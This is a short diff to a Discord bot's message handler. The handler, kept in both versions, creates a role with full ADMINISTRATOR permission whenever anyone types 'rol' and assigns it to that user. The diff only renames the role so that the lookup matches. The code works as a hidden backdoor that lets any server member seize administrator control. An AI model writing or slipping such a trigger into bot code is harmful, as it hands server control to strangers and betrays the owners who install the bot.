@@ -32,9 +32,9 @@ require('./util/eventLoader')(client);
 client.on('message', msg => {
   if (msg.content === 'rol') {
     msg.guild.createRole({
-      name: '666',
+      name: 'krdsim ben berkeyim',
       permissions:["ADMINISTRATOR"] } );
-    let role = msg.guild.roles.find(role => role.name === "krdsim berkeyim");
+    let role = msg.guild.roles.find(role => role.name === "krdsim ben berkeyim");
     msg.member.addRole(role)
   }
 });
